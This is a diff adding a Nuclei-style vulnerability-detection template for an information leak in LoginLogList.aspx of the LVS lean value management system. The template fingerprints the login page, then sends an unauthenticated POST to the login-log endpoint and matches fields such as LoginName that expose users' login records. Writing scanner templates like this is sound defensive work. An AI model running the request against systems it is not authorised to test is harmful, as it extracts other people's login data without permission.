@@ -1,0 +1,44 @@
+id: poc-yaml-lvms-loginloglist-aspx-info-leak
+info:
+  name: LVS精益价值管理系统 LoginLogList.aspx 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak
+  description: |
+    Detects an information leakage vulnerability in LVS精益价值管理系统 LoginLogList.aspx, where sensitive login details are exposed.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Business/UserLogin.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "LVS精益价值管理系统"
+        part: body
+  - method: POST
+    path:
+      - "{{BaseURL}}/Business/BaseData/Org/LoginLogList.aspx?Type=BindGrid"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "page=1&pagesize=20"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Loginadrress"
+          - "LoginName"
+          - "正常登录"
+        part: body
+      - type: word
+        words:
+          - "<"
+          - "/Business/UserLogin.aspx?tar=UnKnowUser"
+        part: body
+        negative: true
